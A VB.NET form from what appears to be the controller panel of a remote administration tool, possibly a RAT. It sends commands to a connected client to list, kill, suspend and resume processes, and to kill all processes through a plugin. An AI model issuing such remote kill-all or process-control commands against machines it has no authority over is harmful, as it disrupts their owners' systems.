Public Class Tasks_Form
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Async Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        '   If ListView2.SelectedItems.Count = 1 Then



        Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|GETTASKSNOTOLD|" & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        '  End If
    End Sub

    Private Sub Tasks_Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Async Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        'CLOSETHAT
        If ListView1.SelectedItems.Count = 1 Then



            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|CLOSETHAT|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        End If
    End Sub

    Private Async Sub InfoProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InfoProcessToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then



            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|INFO|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))


        End If
    End Sub

    Private Async Sub KillAllProcessesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillAllProcessesToolStripMenuItem.Click

        Dim o As String = Form1.PL_VRSA & "|SP1|" & "" & "|SP2|" & "|KAP|" & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        o = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|GETTASKSNOTOLD|" & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

    End Sub

    Private Async Sub SuspendProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendProcessToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then



            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|SUS|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        End If
    End Sub

    Private Async Sub ResumeProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumeProcessToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then



            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|WAKEUP|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        End If
    End Sub
End Class